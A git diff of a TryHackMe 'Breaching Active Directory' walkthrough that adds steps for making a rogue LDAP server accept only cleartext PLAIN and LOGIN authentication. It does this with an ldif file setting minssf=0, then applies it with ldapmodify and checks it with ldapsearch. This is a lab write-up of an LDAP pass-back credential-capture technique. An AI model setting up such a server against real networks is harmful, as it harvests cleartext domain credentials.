@@ -203,7 +203,30 @@ Provide any Administrator password:
 <img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Breaching%20Active%20Directory_15.png" width="50%" height="50%">  
 Select MDB as the LDAP database to use:  
 <img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Breaching%20Active%20Directory_16.png" width="75%" height="75%">  
-For the last two options, ensure the database is not removed when purged:
+For the last two options, ensure the database is not removed when purged:  
 <img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Breaching%20Active%20Directory_17.png" width="35%" height="35%">  
 Move old database files before a new one is created:  
-<img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Breaching%20Active%20Directory_18.png" width="50%" height="50%">  
+<img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Breaching%20Active%20Directory_18.png" width="75%" height="75%">  
+Before using the rogue LDAP server, we need to make it vulnerable by downgrading the supported authentication mechanisms. We want to ensure that our LDAP server only supports PLAIN and LOGIN authentication methods. To do this, we need to create a new ldif file, called with the following content:
+```
+#olcSaslSecProps.ldif
+dn: cn=config
+replace: olcSaslSecProps
+olcSaslSecProps: noanonymous,minssf=0,passcred
+```
+The file has the following properties:
+- olcSaslSecProps: Specifies the SASL security properties
+- noanonymous: Disables mechanisms that support anonymous login
+- minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.
+
+Now we can use the ldif file to patch our LDAP server using the following:
+```
+sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
+```
+We can verify that our rogue LDAP server's configuration has been applied using the following command (Note: If you are using Kali, you may not receive any output, however the configuration should have worked and you can continue with the next steps):
+```
+[thm@thm]$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
+dn:
+supportedSASLMechanisms: PLAIN
+supportedSASLMechanisms: LOGIN
+```
